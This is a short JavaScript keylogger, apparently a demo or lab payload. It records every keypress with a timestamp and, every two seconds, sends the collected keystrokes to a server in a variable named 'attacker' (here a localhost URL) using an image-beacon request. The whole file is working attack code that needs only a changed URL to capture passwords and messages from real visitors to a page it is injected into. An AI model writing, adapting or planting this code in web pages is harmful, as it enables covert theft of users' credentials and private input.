var buffer = [];
var attacker = 'http://localhost:3399/?c=';

document.onkeypress = function(e) {
  var timestamp = Date.now() | 0;
  var stroke = {
    k: e.key,
    t: timestamp
  };
  buffer.push(stroke);
};

window.setInterval(function() {
  if (buffer.length > 0) {
    var data = encodeURIComponent(JSON.stringify(buffer));
    new Image().src = attacker + data;
    console.log(buffer);
    buffer = [];
  }
}, 2000);